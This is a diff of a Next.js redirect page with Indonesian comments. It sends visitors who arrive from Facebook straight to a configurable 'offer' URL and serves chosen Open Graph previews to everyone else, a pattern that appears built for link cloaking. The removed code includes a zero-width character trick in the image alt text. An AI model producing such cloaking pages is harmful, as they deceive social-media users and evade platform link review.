@@ -9,7 +9,7 @@ interface Props {
   title: string;
 }
 
-const offerUrl = "https://example.com/offer"; // 🔁 Ganti dengan URL offer kamu
+const offerUrl = "https://example.com/offer"; // ✅ Ganti dengan offer kamu
 
 export const getServerSideProps: GetServerSideProps = async (context) => {
   const encoded = context.query.data as string;
@@ -24,7 +24,7 @@ export const getServerSideProps: GetServerSideProps = async (context) => {
 
     if (!redirectUrl || !imageUrl) throw new Error("Invalid data");
 
-    // ⛔ Redirect langsung jika dari Facebook
+    // 🔁 Redirect langsung jika dari Facebook
     if (referringURL.includes("facebook.com") || fbclid) {
       return {
         redirect: {
@@ -34,20 +34,18 @@ export const getServerSideProps: GetServerSideProps = async (context) => {
       };
     }
 
-    // ✅ Jika bukan dari Facebook, lanjut render loading redirect
+    // ✅ Tampilkan halaman loading
     return {
       props: {
         redirectUrl,
         imageUrl,
-        title: title || "",
+        title: title || "Redirecting...",
       },
     };
   } catch (err) {
     return { notFound: true };
   }
 };
-
-const blankZWNJ = "\u200C";
 
 export default function RedirectPage({ redirectUrl, imageUrl, title }: Props) {
   useEffect(() => {
@@ -60,30 +58,38 @@ export default function RedirectPage({ redirectUrl, imageUrl, title }: Props) {
   return (
     <>
       <Head>
+        <meta name="description" content={`Read more at ${redirectUrl}`} />
         <meta property="og:title" content={title} />
-        <meta name="description" content={`Click to read more on this page: ${redirectUrl}`} />
+        <meta property="og:description" content={`Click to read more on this page.`} />
         <meta property="og:url" content={redirectUrl} />
         <meta property="og:type" content="website" />
-        <link rel="image_src" href="{imageUrl}/>
         {imageUrl && <meta property="og:image" content={imageUrl} />}
-        <link rel="shortcut icon" href="/varcel.png" type="image/x-icon" />
+        <link rel="image_src" href={imageUrl} />
+        <link rel="icon" href="/varcel.png" type="image/x-icon" />
+        <style>
+          {`
+            @keyframes spin {
+              0% { transform: rotate(0deg); }
+              100% { transform: rotate(360deg); }
+            }
+          `}
+        </style>
       </Head>
 
-      <body style={{ margin: 0, padding: 0 }}>
+      <main style={styles.container}>
+        <div style={styles.loader}></div>
+        <div style={styles.loadingText}>Please wait...</div>
+        {/* Gambar tersembunyi untuk preload dan social preview */}
         {imageUrl && (
           <img
             src={imageUrl}
             width="1200"
             height="630"
-            alt={`${title}${blankZWNJ}`}
-            style={{ display: "none", width: "100%", height: "auto" }}
+            alt={title}
+            style={{ display: "none" }}
           />
         )}
-        <div style={styles.container}>
-          <div style={styles.loader}></div>
-          <div style={styles.loadingText}>Please wait...</div>
-        </div>
-      </body>
+      </main>
     </>
   );
 }
@@ -116,15 +122,3 @@ const styles: { [key: string]: React.CSSProperties } = {
     opacity: 0.8,
   },
 };
-
-// Inject spin animation to head
-if (typeof window !== "undefined") {
-  const style = document.createElement("style");
-  style.innerHTML = `
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-  `;
-  document.head.appendChild(style);
-}
